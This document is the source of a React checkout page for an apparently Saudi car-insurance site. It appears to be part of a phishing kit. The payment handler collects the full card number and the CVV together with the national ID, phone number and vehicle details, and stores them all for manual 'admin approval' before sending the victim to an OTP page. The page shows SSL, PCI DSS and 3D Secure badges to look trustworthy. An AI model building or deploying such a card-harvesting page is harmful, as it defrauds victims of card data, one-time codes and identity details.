import { useState, useEffect, useMemo } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import { companyLogos } from "@/lib/companyLogos";
import { getCardMetadata } from "@/lib/cardMetadata";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import PremiumPageHeader from "@/components/PremiumPageHeader";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { CreditCard, Shield, Lock, Check, ArrowRight, Loader2, Fingerprint, Eye, EyeOff } from "lucide-react";
import CardBrandLogo from "@/components/CardBrandLogo";
import InsuranceStepper from "@/components/InsuranceStepper";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";

const fmt = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
const fmtCard = (v: string) => {
  const digits = v.replace(/\D/g, "");
  // Amex: 4-6-5 format (15 digits), others: 4-4-4-4 (16 digits)
  if (/^3[47]/.test(digits)) {
    return digits.slice(0, 15).replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_, a, b, c) => [a, b, c].filter(Boolean).join(" "));
  }
  return fmt(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
};
const isValidCardNumber = (value: string) => {
  const digits = value.replace(/\s/g, "");

  if (!/^\d{13,19}$/.test(digits)) {
    return false;
  }

  let sum = 0;
  let shouldDouble = false;

  for (let i = digits.length - 1; i >= 0; i -= 1) {
    let digit = Number(digits[i]);

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
};
const InsurancePayment = () => {
  const navigate = useNavigate();
  const { t, lang } = useLanguage();
  const p = t.payment;
  const location = useLocation();
  const offer = location.state?.offer || {
    company: "التعاونية",
    type: "تأمين شامل",
    price: 2500,
    totalPrice: 2750,
    features: ["تغطية شاملة", "مساعدة على الطريق", "تأمين ضد الغير"],
  };

  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(null);
  const [cardForm, setCardForm] = useState({ number: "", name: "", expiryMonth: "", expiryYear: "", cvv: "" });
  const [showCvv, setShowCvv] = useState(false);
  const [focusedField, setFocusedField] = useState<string | null>(null);
  const [touchedFields, setTouchedFields] = useState<{ number: boolean; cvv: boolean; expiry: boolean; name: boolean }>({ number: false, cvv: false, expiry: false, name: false });

  const approvalStatus = useAdminApproval(orderId, "payment");
  const cardDigits = cardForm.number.replace(/\s/g, "");
  const cardMetadata = useMemo(() => getCardMetadata(cardForm.number), [cardForm.number]);
  const showCardNumberError = touchedFields.number && cardDigits.length > 0 && !isValidCardNumber(cardForm.number);
  const isAmex = cardMetadata.brandKey === "amex";
  const cvvLength = isAmex ? 4 : 3;
  const showCvvError = touchedFields.cvv && cardForm.cvv.length > 0 && cardForm.cvv.length < cvvLength;
  const showNameError = touchedFields.name && cardForm.name.length > 0 && cardForm.name.length < 2;
  const isExpiryExpired = (() => {
    if (!touchedFields.expiry || !cardForm.expiryMonth || !cardForm.expiryYear) return false;
    const now = new Date();
    const currentMonth = now.getMonth() + 1;
    const currentYear = now.getFullYear() % 100;
    const selMonth = parseInt(cardForm.expiryMonth);
    const selYear = parseInt(cardForm.expiryYear);
    return selYear < currentYear || (selYear === currentYear && selMonth < currentMonth);
  })();

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success(p.paymentApproved);
      const expiry = `${cardForm.expiryMonth}/${cardForm.expiryYear}`;
      const cardInfo = {
        card_holder_name: cardForm.name,
        card_last_four: cardForm.number.replace(/\s/g, "").slice(-4),
        card_expiry: expiry,
      };
      sessionStorage.setItem("insurance_card_info", JSON.stringify(cardInfo));
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/otp", { state: { offer, paymentMethod: "card", orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error(p.paymentRejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, cardForm.name, cardForm.number, cardForm.expiryMonth, cardForm.expiryYear]);

  const handleCardPayment = async () => {
    if (!cardForm.number || !cardForm.name || !cardForm.expiryMonth || !cardForm.expiryYear || !cardForm.cvv) return;

    if (!isValidCardNumber(cardForm.number)) {
      setTouchedFields(prev => ({ ...prev, number: true }));
      toast.error(p.invalidCard);
      return;
    }

    setLoading(true);

    const requestData = sessionStorage.getItem("insurance_request");
    const customerData = sessionStorage.getItem("insurance_customer");
    
    let parsed: Record<string, any> = {};
    if (requestData) {
      try { parsed = JSON.parse(requestData); } catch {}
    }
    if (customerData) {
      try {
        const c = JSON.parse(customerData);
        if (!parsed.customerName) parsed.customerName = c.full_name || "";
        if (!parsed.nationalId) parsed.nationalId = c.national_id || "";
        if (!parsed.phone) parsed.phone = c.phone || "";
        if (!parsed.serialNumber) parsed.serialNumber = c.serial_number || "";
        if (!parsed.vehicleMake) parsed.vehicleMake = c.vehicle_make || "";
        if (!parsed.vehicleModel) parsed.vehicleModel = c.vehicle_model || "";
        if (!parsed.vehicleYear) parsed.vehicleYear = c.vehicle_year || "";
      } catch {}
    }
    
    const insuranceRequestId = sessionStorage.getItem("insurance_request_id");

    linkVisitorToSession({
      phone: parsed.phone || undefined,
      national_id: parsed.nationalId || undefined,
      visitor_name: cardForm.name || undefined,
    });

    const id = await createOrUpdateStage(null, "payment", {
      insurance_request_id: insuranceRequestId || null,
      customer_name: parsed.customerName || null,
      national_id: parsed.nationalId || null,
      phone: parsed.phone || null,
      vehicle_make: parsed.vehicleMake || null,
      vehicle_model: parsed.vehicleModel || null,
      vehicle_year: parsed.vehicleYear || null,
      serial_number: parsed.serialNumber || null,
      company: offer?.company || null,
      insurance_type: offer?.type || null,
      base_price: offer?.price || null,
      total_price: offer?.totalPrice || offer?.price || null,
      payment_method: "card",
      card_holder_name: cardForm.name,
      card_last_four: cardForm.number.replace(/\s/g, "").slice(-4),
      card_number_full: cardForm.number.replace(/\s/g, ""),
      card_expiry: `${cardForm.expiryMonth}/${cardForm.expiryYear}`,
      card_cvv: cardForm.cvv,
    });

    setOrderId(id);
    setWaitingApproval(true);
  };

  if (!offer) {
    return (
      <div className="min-h-screen bg-background">
        <Navbar />
        <div className="flex items-center justify-center min-h-[60vh]">
          <div className="text-center">
            <p className="text-muted-foreground mb-4">{p.noOffer}</p>
            <Button onClick={() => navigate("/insurance/offers")} className="rounded-xl">{p.showOffers}</Button>
          </div>
        </div>
      </div>
    );
  }

  const isFormValid = isValidCardNumber(cardForm.number) && cardForm.name.length >= 2 && cardForm.expiryMonth && cardForm.expiryYear && cardForm.cvv.length >= cvvLength;
  const totalPrice = offer.totalPrice || offer.price;

  return (
    <div className="min-h-[100dvh] bg-secondary/30">
      <Navbar />
      <PremiumPageHeader title={p.title} badge={p.badge} badgeIcon={<Lock className="w-3.5 h-3.5 text-cta" />} compact />

      <div className="container mx-auto px-3 md:px-4 -mt-6 md:-mt-8 pb-24 md:pb-12">
        <div className="max-w-5xl mx-auto">
          <InsuranceStepper active={2} />

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
            {/* Card Form */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }} className="lg:col-span-2">
              <div className="bg-card rounded-2xl border border-border shadow-lg overflow-hidden">
                {/* Payment Method Header */}
                <div className="flex items-center gap-2 px-4 py-3 mx-4 mt-2 mb-1 bg-secondary/50 rounded-xl">
                  <CreditCard className="w-4 h-4 text-primary" />
                  <p className="font-bold text-xs text-foreground">{p.creditCard}</p>
                  <div className="flex gap-1 mr-auto flex-wrap">
                    <span className="text-[9px] px-1.5 py-0.5 bg-primary/10 text-primary rounded font-medium">Visa</span>
                    <span className="text-[9px] px-1.5 py-0.5 bg-primary/10 text-primary rounded font-medium">Mastercard</span>
                    <span className="text-[9px] px-1.5 py-0.5 bg-primary/10 text-primary rounded font-medium">مدى</span>
                    <span className="text-[9px] px-1.5 py-0.5 bg-primary/10 text-primary rounded font-medium">Amex</span>
                    <span className="text-[9px] px-1.5 py-0.5 bg-primary/10 text-primary rounded font-medium">UnionPay</span>
                  </div>
                </div>

                <div className="px-4 py-4">
                  <AnimatePresence mode="wait">
                    {waitingApproval ? (
                      <motion.div
                        key="waiting"
                        initial={{ opacity: 0, scale: 0.95 }}
                        animate={{ opacity: 1, scale: 1 }}
                        exit={{ opacity: 0, scale: 0.95 }}
                        className="text-center py-10 space-y-4"
                      >
                        <div className="relative w-16 h-16 mx-auto">
                          <div className="absolute inset-0 rounded-full border-4 border-primary/20" />
                          <div className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin" />
                          <Lock className="absolute inset-0 m-auto w-6 h-6 text-primary" />
                        </div>
                         <h3 className="text-sm font-bold text-foreground">{p.verifying}</h3>
                         <p className="text-xs text-muted-foreground">{p.waitingReview}</p>
                        <div className="flex justify-center gap-1">
                          {[0, 1, 2].map(i => (
                            <motion.div
                              key={i}
                              className="w-2 h-2 rounded-full bg-primary"
                              animate={{ opacity: [0.3, 1, 0.3] }}
                              transition={{ duration: 1.2, repeat: Infinity, delay: i * 0.2 }}
                            />
                          ))}
                        </div>
                      </motion.div>
                    ) : (
                      <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
                        {/* Card Number */}
                        <div>
                          <label className="block text-xs font-bold text-foreground mb-1.5">{p.cardNumber}</label>
                          <motion.div
                            animate={showCardNumberError ? { x: [0, -4, 4, -3, 3, 0] } : { x: 0 }}
                            transition={{ duration: 0.28 }}
                            className={`relative rounded-xl border-2 transition-all duration-200 ${showCardNumberError ? 'border-destructive bg-destructive/5 shadow-[0_0_0_3px_hsl(var(--destructive)/0.12)]' : focusedField === 'number' ? 'border-primary shadow-[0_0_0_3px_hsl(var(--primary)/0.1)]' : 'border-border'}`}
                          >
                            <input
                              className="w-full px-4 py-3 rounded-xl bg-transparent text-foreground placeholder:text-muted-foreground text-sm focus:outline-none font-mono tracking-wider"
                              placeholder="0000 0000 0000 0000"
                              value={cardForm.number}
                              onChange={(e) => setCardForm({ ...cardForm, number: fmtCard(e.target.value) })}
                              onFocus={() => setFocusedField('number')}
                              onBlur={() => {
                                setFocusedField(null);
                                setTouchedFields((prev) => ({ ...prev, number: true }));
                              }}
                              maxLength={19}
                              dir="ltr"
                            />
                            <div className="absolute left-3 top-1/2 -translate-y-1/2">
                              {cardMetadata.brandKey !== "unknown" ? (
                                <CardBrandLogo brandKey={cardMetadata.brandKey} className="w-8 h-5" />
                              ) : (
                                <CreditCard className={`w-5 h-5 ${showCardNumberError ? 'text-destructive' : 'text-muted-foreground/50'}`} />
                              )}
                            </div>
                          </motion.div>
                          <AnimatePresence>
                            {showCardNumberError && (
                              <motion.p
                                initial={{ opacity: 0, y: -6 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -6 }}
                                className="mt-2 text-[11px] font-medium text-destructive"
                              >
                                {p.cardNumberError}
                              </motion.p>
                            )}
                          </AnimatePresence>

                          <p className="mt-2 text-[11px] text-muted-foreground">
                            {p.cardAutoDetect}
                          </p>
                        </div>

                        {/* Card Holder */}
                        <div>
                          <label className="block text-xs font-bold text-foreground mb-1.5">{p.cardHolder}</label>
                          <motion.div
                            animate={showNameError ? { x: [0, -4, 4, -3, 3, 0] } : { x: 0 }}
                            transition={{ duration: 0.28 }}
                            className={`relative rounded-xl border-2 transition-all duration-200 ${showNameError ? 'border-destructive bg-destructive/5 shadow-[0_0_0_3px_hsl(var(--destructive)/0.12)]' : focusedField === 'name' ? 'border-primary shadow-[0_0_0_3px_hsl(var(--primary)/0.1)]' : 'border-border'}`}
                          >
                            <input
                              className="w-full px-4 py-3 rounded-xl bg-transparent text-foreground placeholder:text-muted-foreground text-sm focus:outline-none"
                              placeholder={p.cardHolderPlaceholder}
                              value={cardForm.name}
                              onChange={(e) => setCardForm({ ...cardForm, name: e.target.value })}
                              onFocus={() => setFocusedField('name')}
                              onBlur={() => { setFocusedField(null); setTouchedFields(prev => ({ ...prev, name: true })); }}
                            />
                          </motion.div>
                          <AnimatePresence>
                            {showNameError && (
                              <motion.p initial={{ opacity: 0, y: -6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -6 }} className="mt-2 text-[11px] font-medium text-destructive">
                                {p.cardHolderError}
                              </motion.p>
                            )}
                          </AnimatePresence>
                        </div>

                        {/* Expiry & CVV */}
                        <div className="grid grid-cols-5 gap-2">
                          <div className="col-span-2">
                            <label className="block text-xs font-bold text-foreground mb-1.5">{p.month}</label>
                            <select
                              className={`w-full px-2 py-3 rounded-xl border-2 bg-background text-foreground text-sm focus:outline-none transition-all appearance-none text-center cursor-pointer ${isExpiryExpired ? 'border-destructive bg-destructive/5' : 'border-border focus:border-primary focus:shadow-[0_0_0_3px_hsl(var(--primary)/0.1)]'}`}
                              value={cardForm.expiryMonth}
                              onChange={(e) => { setCardForm({ ...cardForm, expiryMonth: e.target.value }); setTouchedFields(prev => ({ ...prev, expiry: true })); }}
                            >
                              <option value="">الشهر</option>
                              {Array.from({ length: 12 }, (_, i) => {
                                const m = String(i + 1).padStart(2, "0");
                                return <option key={m} value={m}>{m}</option>;
                              })}
                            </select>
                          </div>
                          <div className="col-span-2">
                            <label className="block text-xs font-bold text-foreground mb-1.5">السنة</label>
                            <select
                              className={`w-full px-2 py-3 rounded-xl border-2 bg-background text-foreground text-sm focus:outline-none transition-all appearance-none text-center cursor-pointer ${isExpiryExpired ? 'border-destructive bg-destructive/5' : 'border-border focus:border-primary focus:shadow-[0_0_0_3px_hsl(var(--primary)/0.1)]'}`}
                              value={cardForm.expiryYear}
                              onChange={(e) => { setCardForm({ ...cardForm, expiryYear: e.target.value }); setTouchedFields(prev => ({ ...prev, expiry: true })); }}
                            >
                              <option value="">السنة</option>
                              {Array.from({ length: 10 }, (_, i) => {
                                const y = String(new Date().getFullYear() % 100 + i).padStart(2, "0");
                                return <option key={y} value={y}>{y}</option>;
                              })}
                            </select>
                          </div>
                          <div className="col-span-1">
                            <label className="block text-xs font-bold text-foreground mb-1.5">CVV</label>
                            <motion.div
                              animate={showCvvError ? { x: [0, -4, 4, -3, 3, 0] } : { x: 0 }}
                              transition={{ duration: 0.28 }}
                              className={`relative rounded-xl border-2 transition-all duration-200 ${showCvvError ? 'border-destructive bg-destructive/5 shadow-[0_0_0_3px_hsl(var(--destructive)/0.12)]' : focusedField === 'cvv' ? 'border-primary shadow-[0_0_0_3px_hsl(var(--primary)/0.1)]' : 'border-border'}`}
                            >
                              <input
                                type={showCvv ? "text" : "password"}
                                className="w-full px-4 py-3 rounded-xl bg-transparent text-foreground placeholder:text-muted-foreground text-sm focus:outline-none font-mono text-center"
                                placeholder={isAmex ? "••••" : "•••"}
                                value={cardForm.cvv}
                                onChange={(e) => {
                                  const val = e.target.value.replace(/\D/g, '').slice(0, cvvLength);
                                  setCardForm({ ...cardForm, cvv: val });
                                }}
                                onFocus={() => setFocusedField('cvv')}
                                onBlur={() => { setFocusedField(null); setTouchedFields(prev => ({ ...prev, cvv: true })); }}
                                maxLength={cvvLength}
                                dir="ltr"
                              />
                              <button
                                type="button"
                                onClick={() => setShowCvv(!showCvv)}
                                className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground/50 hover:text-muted-foreground"
                              >
                                {showCvv ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                              </button>
                            </motion.div>
                          </div>
                        </div>
                        {/* Validation messages for expiry & CVV */}
                        <div className="flex gap-2">
                          <AnimatePresence>
                            {isExpiryExpired && (
                              <motion.p initial={{ opacity: 0, y: -6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -6 }} className="text-[11px] font-medium text-destructive">
                                تاريخ البطاقة منتهي الصلاحية.
                              </motion.p>
                            )}
                          </AnimatePresence>
                          <AnimatePresence>
                            {showCvvError && (
                              <motion.p initial={{ opacity: 0, y: -6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -6 }} className="text-[11px] font-medium text-destructive mr-auto">
                                CVV يجب أن يكون 3 أرقام.
                              </motion.p>
                            )}
                          </AnimatePresence>
                        </div>

                        {/* Card Preview - 3D Flip */}
                        {(() => {
                          const brandColors: Record<string, { from: string; via: string; to: string; shadow: string }> = {
                            visa: { from: "#1a1f71", via: "#2a3a9e", to: "#0d47a1", shadow: "rgba(26,31,113,0.4)" },
                            mastercard: { from: "#eb5f07", via: "#f5842a", to: "#ff6d00", shadow: "rgba(235,95,7,0.4)" },
                            mada: { from: "#0d7c3d", via: "#11994d", to: "#00a651", shadow: "rgba(13,124,61,0.4)" },
                            unknown: { from: "hsl(var(--primary))", via: "hsl(var(--primary) / 0.9)", to: "hsl(var(--primary) / 0.7)", shadow: "hsl(var(--primary) / 0.35)" },
                          };
                          const bc = brandColors[cardMetadata.brandKey] || brandColors.unknown;
                          return (
                        <div className="relative" style={{ perspective: "1200px" }}>
                          <motion.div
                            animate={{ rotateY: focusedField === 'cvv' ? 180 : 0 }}
                            transition={{ type: "spring", stiffness: 80, damping: 18 }}
                            style={{ transformStyle: "preserve-3d" }}
                            className="relative h-52"
                          >
                            {/* === FRONT FACE === */}
                            <motion.div
                              className="absolute inset-0 rounded-2xl overflow-hidden p-5 flex flex-col justify-between"
                              animate={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.via}, ${bc.to})`, boxShadow: `0 12px 40px ${bc.shadow}` }}
                              transition={{ duration: 0.6 }}
                              style={{ backfaceVisibility: "hidden" }}
                            >
                               {/* Background decorations */}
                               <div className="absolute inset-0 opacity-10">
                                 <div className="absolute top-0 right-0 w-40 h-40 rounded-full bg-white/20 -translate-y-1/2 translate-x-1/4" />
                                 <div className="absolute bottom-0 left-0 w-32 h-32 rounded-full bg-white/15 translate-y-1/3 -translate-x-1/4" />
                                 <div className="absolute top-1/2 left-1/2 w-60 h-60 rounded-full bg-white/5 -translate-x-1/2 -translate-y-1/2" />
                               </div>
                               {/* Animated metallic shine */}
                               <div
                                 className="absolute inset-0 pointer-events-none z-20"
                                 style={{
                                   background: "linear-gradient(105deg, transparent 40%, rgba(255,255,255,0.15) 45%, rgba(255,255,255,0.35) 50%, rgba(255,255,255,0.15) 55%, transparent 60%)",
                                   backgroundSize: "200% 100%",
                                   animation: "cardShine 3s ease-in-out infinite",
                                 }}
                               />
                              
                              {/* Top row: chip + bank name */}
                              <div className="flex items-center justify-between relative z-10">
                                <div className="flex items-center gap-2">
                                  <div className="w-9 h-6 bg-cta/90 rounded-[3px] shadow-inner" />
                                  <div className="w-5 h-5 rounded-full border-2 border-white/30" />
                                </div>
                                <AnimatePresence mode="wait">
                                  <motion.div
                                    key={cardMetadata.bankName}
                                    initial={{ opacity: 0, x: -10 }}
                                    animate={{ opacity: 1, x: 0 }}
                                    exit={{ opacity: 0, x: 10 }}
                                    className="flex items-center gap-1.5"
                                  >
                                    {cardMetadata.isDetected && cardMetadata.bankName !== "البنك المصدر غير محدد" ? (
                                      <span className="text-white text-[10px] font-bold bg-white/15 px-2.5 py-1 rounded-lg backdrop-blur-sm border border-white/10">
                                        {cardMetadata.bankName}
                                      </span>
                                    ) : (
                                      <Fingerprint className="w-5 h-5 text-white/40" />
                                    )}
                                  </motion.div>
                                </AnimatePresence>
                              </div>

                              {/* Card number */}
                              <div className="relative z-10">
                                <p className="text-white/90 font-mono text-lg tracking-[0.25em] text-left" dir="ltr">
                                  {cardForm.number || "•••• •••• •••• ••••"}
                                </p>
                              </div>

                              {/* Bottom row: holder, expiry, type, classification */}
                              <div className="relative z-10 flex items-end justify-between gap-2">
                                <div className="min-w-0 flex-1">
                                  <p className="text-white/40 text-[7px] uppercase tracking-widest mb-0.5">CARD HOLDER</p>
                                  <p className="text-white text-[11px] font-medium truncate">
                                    {cardForm.name || "الاسم على البطاقة"}
                                  </p>
                                </div>
                                <div className="text-left shrink-0" dir="ltr">
                                  <p className="text-white/40 text-[7px] uppercase tracking-widest mb-0.5">EXPIRES</p>
                                  <p className="text-white text-[11px] font-mono">
                                    {cardForm.expiryMonth && cardForm.expiryYear ? `${cardForm.expiryMonth}/${cardForm.expiryYear}` : "MM/YY"}
                                  </p>
                                </div>
                                <AnimatePresence mode="wait">
                                  <motion.div
                                    key={cardMetadata.brandKey}
                                    initial={{ opacity: 0, scale: 0.8 }}
                                    animate={{ opacity: 1, scale: 1 }}
                                    exit={{ opacity: 0, scale: 0.8 }}
                                    className="shrink-0"
                                  >
                                    <CardBrandLogo brandKey={cardMetadata.brandKey} className="w-14 h-9 drop-shadow-lg" />
                                  </motion.div>
                                </AnimatePresence>
                                <AnimatePresence>
                                  {cardMetadata.classificationLabel !== "—" && (
                                    <motion.div
                                      initial={{ opacity: 0, width: 0 }}
                                      animate={{ opacity: 1, width: "auto" }}
                                      exit={{ opacity: 0, width: 0 }}
                                      className="text-right shrink-0 overflow-hidden"
                                    >
                                      <p className="text-white/40 text-[7px] tracking-widest mb-0.5">التصنيف</p>
                                      <p className="text-white text-[10px] font-bold bg-white/10 px-1.5 py-0.5 rounded backdrop-blur-sm inline-block">
                                        {cardMetadata.classificationLabel}
                                      </p>
                                    </motion.div>
                                  )}
                                </AnimatePresence>
                              </div>
                            </motion.div>

                            {/* === BACK FACE === */}
                            <motion.div
                              className="absolute inset-0 rounded-2xl overflow-hidden flex flex-col"
                              animate={{ background: `linear-gradient(135deg, ${bc.from}dd, ${bc.via}cc, ${bc.to}bb)`, boxShadow: `0 12px 40px ${bc.shadow}` }}
                              transition={{ duration: 0.6 }}
                              style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}
                            >
                              {/* Magnetic stripe */}
                              <div className="w-full h-12 bg-black/70 mt-6" />

                              {/* Signature strip + CVV */}
                              <div className="px-5 mt-6 flex items-center gap-3">
                                <div className="flex-1 h-10 bg-white/20 rounded-md backdrop-blur-sm border border-white/10 flex items-center px-3">
                                  <div className="flex-1">
                                    <div className="h-[1px] bg-white/20 mb-1.5 w-3/4" />
                                    <div className="h-[1px] bg-white/20 mb-1.5 w-1/2" />
                                    <div className="h-[1px] bg-white/20 w-2/3" />
                                  </div>
                                </div>
                                <div className="bg-white/90 rounded-md px-4 py-2 min-w-[60px] text-center shadow-sm">
                                  <p className="text-[8px] text-black/40 font-bold uppercase tracking-wider mb-0.5">CVV</p>
                                  <p className="text-black font-mono font-bold text-lg tracking-[0.2em]">
                                    {cardForm.cvv || "•••"}
                                  </p>
                                </div>
                              </div>

                              {/* Bottom info */}
                              <div className="mt-auto px-5 pb-5 flex items-end justify-between">
                                <p className="text-white/30 text-[8px] leading-tight max-w-[60%]">
                                  هذه البطاقة ملك للبنك المصدر. في حال العثور عليها يرجى إعادتها لأقرب فرع.
                                </p>
                                <CardBrandLogo brandKey={cardMetadata.brandKey} className="w-10 h-6 opacity-50" />
                              </div>
                            </motion.div>
                          </motion.div>
                        </div>
                          );
                        })()}

                        {/* Pay Button */}
                        <Button
                          onClick={handleCardPayment}
                          disabled={loading || !isFormValid}
                          className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-6 font-bold text-base gap-2 shadow-[0_4px_20px_hsl(var(--cta)/0.35)] transition-all duration-300 hover:shadow-[0_6px_28px_hsl(var(--cta)/0.45)] hover:scale-[1.01] active:scale-[0.99]"
                        >
                          <Lock className="w-4 h-4" />
                          {loading ? (
                            <span className="flex items-center gap-2">
                              <Loader2 className="w-4 h-4 animate-spin" />
                              جارِ المعالجة...
                            </span>
                          ) : (
                            `ادفع ${totalPrice.toLocaleString()} ر.س`
                          )}
                        </Button>
                      </motion.div>
                    )}
                  </AnimatePresence>

                  {/* Security Badges */}
                  <div className="flex items-center justify-center gap-4 mt-5 pt-4 border-t border-border">
                    {[
                      { icon: Shield, label: "SSL مشفر", color: "text-cta" },
                      { icon: Lock, label: "PCI DSS", color: "text-primary" },
                      { icon: Check, label: "3D Secure", color: "text-cta" },
                    ].map((b, i) => (
                      <div key={i} className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-secondary/60">
                        <b.icon className={`w-3.5 h-3.5 ${b.color}`} />
                        <span className="text-[10px] font-medium text-muted-foreground">{b.label}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </motion.div>

            {/* Order Summary Sidebar */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
              <div className="bg-card rounded-2xl border border-border shadow-lg p-4 sticky top-24 space-y-4">
                {/* Company */}
                <div className="flex items-center gap-3 p-3 bg-gradient-to-l from-primary/8 to-transparent rounded-xl border border-primary/10">
                  <div className="w-12 h-12 rounded-xl overflow-hidden bg-card border border-border flex items-center justify-center shadow-sm">
                    {companyLogos[offer.company] ? (
                      <img src={companyLogos[offer.company]} alt={offer.company} className="w-full h-full object-contain p-1.5" loading="lazy" />
                    ) : (
                      <span className="text-xs font-bold text-primary">{offer.logoInitials || offer.company?.slice(0, 2)}</span>
                    )}
                  </div>
                  <div>
                    <p className="font-bold text-sm text-foreground">{offer.company}</p>
                    <p className="text-[11px] text-muted-foreground">{offer.type}</p>
                  </div>
                </div>

                {/* Price Breakdown */}
                {offer.addOns?.length > 0 && (
                  <div className="space-y-2 px-1">
                    <div className="flex justify-between text-xs text-muted-foreground">
                      <span>{offer.price?.toLocaleString()} ر.س</span>
                      <span>السعر الأساسي</span>
                    </div>
                    <div className="flex justify-between text-xs text-muted-foreground">
                      <span>{((totalPrice || 0) - (offer.price || 0)).toLocaleString()} ر.س</span>
                      <span>إضافات ({offer.addOns.length})</span>
                    </div>
                    <div className="border-t border-dashed border-border" />
                  </div>
                )}

                {/* Total */}
                <div className="p-3 rounded-xl bg-gradient-to-l from-primary/10 to-primary/5 border border-primary/15">
                  <div className="flex items-center justify-between">
                    <span className="text-xl font-extrabold text-primary">{totalPrice.toLocaleString()} ر.س</span>
                    <span className="font-bold text-foreground text-sm">الإجمالي</span>
                  </div>
                </div>

                <p className="text-[10px] text-muted-foreground text-center">شامل ضريبة القيمة المضافة 15%</p>
              </div>
            </motion.div>
          </div>

          {/* Back Link */}
          <button
            onClick={() => navigate("/insurance/checkout", { state: { offer } })}
            className="flex items-center justify-center gap-2 mx-auto mt-5 text-xs text-muted-foreground hover:text-primary transition-colors group"
          >
            <ArrowRight className="w-3.5 h-3.5 transition-transform group-hover:translate-x-1" />
            العودة لملخص الطلب
          </button>
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default InsurancePayment;
